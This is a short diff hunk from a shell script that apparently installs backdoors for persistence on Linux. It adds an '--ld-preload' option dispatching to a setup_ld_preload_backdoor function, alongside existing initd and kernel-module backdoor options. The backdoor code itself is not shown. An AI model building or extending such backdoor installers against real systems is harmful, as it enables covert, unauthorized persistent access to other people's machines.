@@ -92,6 +92,11 @@ main() {
 				setup_initd_backdoor "$@"
 				exit
 				;;
+			--ld-preload )
+				shift
+				setup_ld_preload_backdoor "$@"
+				exit
+				;;
 			--lkm )
 				shift
 				setup_lkm_backdoor "$@"
